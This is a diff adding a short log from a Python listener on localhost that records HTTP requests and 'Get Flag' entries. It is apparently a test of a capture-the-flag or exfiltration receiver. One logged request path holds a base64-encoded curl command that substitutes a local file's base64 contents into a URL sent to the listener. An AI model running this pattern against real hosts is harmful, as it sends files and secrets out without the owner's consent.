@@ -1,0 +1,10 @@
+Sat, 29 Apr 2017 07:19:45 listen.py[line:33][thread:4445089616] INFO Proxy Client ('127.0.0.1', 3333) Listening Success...
+Sat, 29 Apr 2017 07:22:18 listen.py[line:56][thread:4451488784] INFO data:GET /429/Y3VybCBodHRwOi8vbG9jYWxob3N0OjMzMzMvNDI5L2BiYXNlNjQgLWkgLi90ZXN0LnR4dGA= HTTP/1.1
+Host: localhost:3333
+User-Agent: curl/7.51.0
+Accept: */*
+
+from:('127.0.0.1', 62288)
+Sat, 29 Apr 2017 07:22:18 listen.py[line:57][thread:4451488784] INFO []
+Sat, 29 Apr 2017 07:22:18 listen.py[line:58][thread:4451488784] INFO ('127.0.0.1', 62288)
+Sat, 29 Apr 2017 07:22:18 listen.py[line:59][thread:4451488784] INFO Get Flag:[] from IP:('127.0.0.1', 62288)
